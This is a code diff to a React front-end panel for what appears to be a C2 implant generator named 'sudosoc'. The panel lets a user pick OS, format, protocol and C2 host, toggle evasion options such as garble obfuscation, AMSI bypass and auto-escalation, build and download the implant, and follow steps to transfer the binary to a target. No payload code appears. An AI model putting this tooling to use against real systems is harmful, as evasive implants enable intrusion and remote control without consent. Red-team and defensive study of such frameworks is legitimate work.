-                    <div className="w-2.5 h-2.5 rounded-full bg-primary/60" />
-                    <span className="text-muted text-[9px] ml-2">server console</span>
-                  </div>
-                  <div className="p-3 font-mono text-xs text-primary bg-[#050510]">
-                    <span className="text-muted select-none">sudosoc {'>'} </span>
-                    <span className="whitespace-pre-wrap break-all">{result.command}</span>
-                  </div>
-                </div>
-              </div>
-
-              <div className="rounded-xl border border-border/60 bg-[#0a0a14] p-3 text-xs text-muted">
-                <div className="text-text text-[10px] font-semibold uppercase tracking-widest mb-2">Next Steps</div>
-                <ol className="list-decimal list-inside flex flex-col gap-1 text-[11px]">
-                  <li>Start listener: <span className="text-accent font-mono">sudosoc {'>'} {protocol}</span></li>
-                  <li>Copy the command above and paste it in the server console</li>
-                  <li>Transfer the generated binary to your target</li>
-                  {isAndroid && isAPK
-                    ? <li>Package as APK: <span className="text-accent font-mono">make android-apk</span> then install via ADB</li>
-                    : <li>Execute it — new session appears in Sessions tab</li>
-                  }
-                </ol>
-              </div>
-            </div>
-          )}
-
-          {/* Summary card */}
-          {opts && !result && (
-            <div className="rounded-xl border border-border/60 bg-[#0a0a14] p-3 flex flex-col gap-2 text-xs">
-              <div className="text-muted text-[10px] uppercase tracking-widest mb-1">Current Config</div>
-              {[
-                ['OS',       `${os} (${arch})`],
-                ['Format',   opts.formats.find(f => f.value === format)?.label ?? format],
-                ['Channel',  opts.protocols.find(p => p.value === protocol)?.label ?? protocol],
-                ['C2',       c2host ? `${c2host}:${c2port}` : `<host>:${c2port}`],
-                ['Evasion',  Object.entries(evasion).filter(([,v]) => v).map(([k]) => k).join(', ') || 'none'],
-              ].map(([k, v]) => (
-                <div key={k} className="flex justify-between items-start gap-3">
-                  <span className="text-muted shrink-0">{k}</span>
-                  <span className={`text-right break-all ${!c2host && k === 'C2' ? 'text-warn' : 'text-text'}`}>{v}</span>
-                </div>
+          {showEvasion && (
+            <div className="p-2 grid grid-cols-2 gap-1">
+              {EVASION_OPTS
+                .filter(opt => opt.platform === 'all' || opt.platform === os)
+                .map(opt => (
+                <button key={opt.key}
+                  onClick={() => toggleEvasion(opt.key)}
+                  title={opt.desc}
+                  className={`flex items-center gap-2 px-2.5 py-1.5 rounded border text-left transition-all ${
+                    evasion[opt.key]
+                      ? 'border-primary/40 bg-primary/8 text-primary'
+                      : 'border-border text-muted hover:border-border/80'
+                  }`} style={{ fontSize: 9.5 }}>
+                  <span className={`w-2 h-2 rounded-full shrink-0 ${evasion[opt.key] ? 'bg-primary' : 'bg-dim'}`} />
+                  {opt.label}
+                </button>
               ))}
             </div>
           )}
         </div>
+
+        {/* Generate button */}
+        <div className="shrink-0 flex items-center gap-2">
+          <button onClick={generate} disabled={loading || !c2host.trim()}
+            className="btn btn-primary flex-1"
+            style={{ padding: '10px 20px', fontSize: 12, fontWeight: 700 }}>
+            {loading
+              ? <><Loader size={13} className="animate-spin" /> Building…</>
+              : <><Zap size={13} /> Generate {plat.icon} {activeFmt.label}</>
+            }
+          </button>
+          {result && (
+            <>
+              <button onClick={executeInTerminal} disabled={running}
+                className="btn btn-primary" title="Execute generate command on server terminal">
+                {running ? <Loader size={12} className="animate-spin" /> : <Play size={12} />}
+                <span style={{ fontSize: 10 }}>Execute</span>
+              </button>
+              <button onClick={() => { navigator.clipboard.writeText(buildCommand()); setCopied(true); setTimeout(()=>setCopied(false),1500) }}
+                className="btn btn-ghost" title="Copy command">
+                {copied ? <CheckCheck size={11} /> : <Copy size={11} />}
+              </button>
+              {result.path && (
+                <button onClick={downloadImplant}
+                  className="btn btn-ghost" title="Download binary">
+                  <Download size={11} />
+                </button>
+              )}
+            </>
+          )}
+        </div>
+
+        {error && (
+          <div className="shrink-0 flex items-center gap-2 px-3 py-2 rounded border border-danger/30 bg-danger/5"
+            style={{ fontSize: 10, color: 'var(--danger)' }}>
+            <AlertCircle size={12} /> {error}
+          </div>
+        )}
+
+        {/* Terminal output */}
+        <div className="flex-1 panel min-h-0 flex flex-col overflow-hidden">
+          <div className="section-hdr">
+            <TermIcon size={10} className="text-primary" />
+            Build Output
+            {terminal.length > 0 && (
+              <button onClick={() => setTerminal([])}
+                className="ml-auto text-muted hover:text-danger" style={{ fontSize: 9 }}>
+                Clear
+              </button>
+            )}
+          </div>
+          <div ref={termRef} className="flex-1 overflow-y-auto p-3 font-mono space-y-0.5"
+            style={{ background: '#040404', fontSize: 10.5 }}>
+            {terminal.length === 0 ? (
+              <div className="flex flex-col items-center justify-center h-full gap-3 text-center py-8">
+                <TermIcon size={28} style={{ color: 'var(--dim)' }} />
+                <div className="text-muted" style={{ fontSize: 11 }}>
+                  Configure options → click Generate
+                </div>
+                <div className="text-muted" style={{ fontSize: 9 }}>
+                  Output will appear here in real-time
+                </div>
+              </div>
+            ) : terminal.map((line, i) => (
+              <div key={i} className={
+                line.type === 'cmd'  ? 'text-primary font-semibold' :
+                line.type === 'ok'   ? 'text-primary' :
+                line.type === 'err'  ? 'text-danger' :
+                line.type === 'info' ? 'text-accent' :
+                'text-text/80'
+              }>
+                {line.text}
+              </div>
+            ))}
+            {(loading || running) && (
+              <div className="text-muted flex items-center gap-1.5">
+                <Loader size={10} className="animate-spin" />
+                <span>{loading ? 'Compiling with garble…' : 'Executing on server…'}</span>
+              </div>
+            )}
+          </div>
+        </div>
+
+        {/* Result summary */}
+        {result && (
+          <div className="shrink-0 panel p-3 space-y-2">
+            <div className="flex items-center gap-2">
+              <CheckCircle2 size={13} className="text-primary" />
+              <span className="text-primary font-semibold" style={{ fontSize: 11 }}>
+                {plat.icon} {plat.label} {activeFmt.label} generated
+              </span>
+            </div>
+            <div className="bg-bg rounded border border-border p-2 font-mono"
+              style={{ fontSize: 9.5, color: 'var(--accent)' }}>
+              {buildCommand()}
+            </div>
+            {result.message && (
+              <div className="text-muted" style={{ fontSize: 9.5 }}>{result.message}</div>
+            )}
+            <div className="flex gap-2 flex-wrap" style={{ fontSize: 9 }}>
+              <span className="badge badge-session">OS: {os}/{arch}</span>
+              <span className="badge badge-beacon">Format: {activeFmt.label}</span>
+              <span className="badge badge-session">Protocol: {protocol}</span>
+              <span className="badge badge-session">Mode: {beacon ? 'Beacon' : 'Session'}</span>
+              {evasion.obfuscate    && <span className="badge badge-win">Garble ✓</span>}
+              {evasion.auto_escalate && <span className="badge badge-win">AutoRoot ✓</span>}
+              {evasion.amsi_bypass && os === 'windows' && <span className="badge badge-win">AMSI ✓</span>}
+            </div>
+          </div>
+        )}
       </div>
     </div>
   )
+}
+
+// tiny import shim
+function Antenna({ size, className }: { size: number; className?: string }) {
+  return <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 24 24"
+    fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"
+    className={className}>
+    <path d="M2 12 L12 2 L22 12"/><path d="M12 2v20"/><path d="M5 19.5 L12 12 L19 19.5"/>
+  </svg>
 }
